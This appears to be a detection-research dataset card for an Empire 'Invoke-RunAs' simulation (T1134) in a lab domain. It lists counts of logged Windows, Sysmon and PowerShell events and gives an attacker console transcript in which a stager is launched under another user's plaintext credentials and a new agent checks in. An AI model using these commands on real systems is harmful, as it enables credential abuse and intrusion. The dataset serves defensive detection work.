# Empire Invoke Runas

Adversaries can execute a stager with explicit credentials runas style.

## Technique(s) ID

T1134

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_runas.tar.gz](./empire_invoke_runas.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18204300

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             376 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |              14 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             145 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             131 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              23 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Authentication Service                        |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |              42 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             466 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             419 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             363 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             135 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              20 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              15 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               6 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             325 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Attacker Activity

```
(Empire: TKV35P8X) > scriptimport /tmp/invoke-runas-cmd.ps1
[*] Tasked TKV35P8X to run TASK_SCRIPT_IMPORT
[*] Agent TKV35P8X tasked with task ID 22
script successfully saved in memory

(Empire: TKV35P8X) > scriptcmd Invoke-RunAs -username pgustavo -password "W1n1!19" -domain shire -Cmd cmd.exe -Arguments "/c C:\windows\system32\autoupdate.vbs"

[*] Tasked TKV35P8X to run TASK_SCRIPT_COMMAND
[*] Agent TKV35P8X tasked with task ID 23
(Empire: TKV35P8X) > Job started: G16X7P

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                   
-------  ------    -----      -----     ------     --  -- -----------                                                   
     18       4     1528       1200       0.00   6732   1 cmd                                                           


[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent V6W3TH8Y checked in
[+] Initial agent V6W3TH8Y from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to V6W3TH8Y at 10.0.10.103

(Empire: TKV35P8X) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 20:43:55  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 20:43:51  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 20:43:54  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 20:43:52  https           

(Empire: agents) >
```